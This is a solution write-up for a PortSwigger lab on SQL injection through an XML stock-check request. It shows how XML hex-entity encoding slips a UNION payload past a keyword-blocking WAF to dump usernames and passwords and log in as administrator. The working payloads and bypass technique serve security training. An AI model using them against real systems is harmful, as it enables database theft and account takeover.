# Lab 18 — SQL injection with filter bypass via XML encoding

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

**Entry point:** `POST /product/stock` (XML body, `storeId` field)

## Goal

Bypass a WAF that blocks SQL keywords by **XML-encoding** the payload —
the WAF sees entities, the backend decodes them *before* the query.

## Solution

1. Intercept the stock check. The body is XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

2. Confirm `storeId` is evaluated as SQL — `1+1` returns the stock of
   store 2.

3. Test a UNION — blocked by the WAF:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

4. **Bypass:** XML-encode the payload (hex or decimal entities). With
   Hackvertor: select the payload → *Extensions → Hackvertor → Encode →
   hex_entities*. The original query returns **one column**, and we
   concatenate both fields into it:

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

which is sent as e.g. `1 UNION ...` →
`1 UNION ...` character-encoded:
`&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;...`

5. The WAF passes it; the app decodes the entities and executes the query.
   The response lists `username~password` for every user.

6. Log in as `administrator` with the leaked password — lab solved.

## Key idea

Sanitization ran on the **raw XML text**, but entity decoding happens at
XML parse time — *before* the value reaches the SQL layer. Encoding is an
obfuscation of the transport, not of the final query.
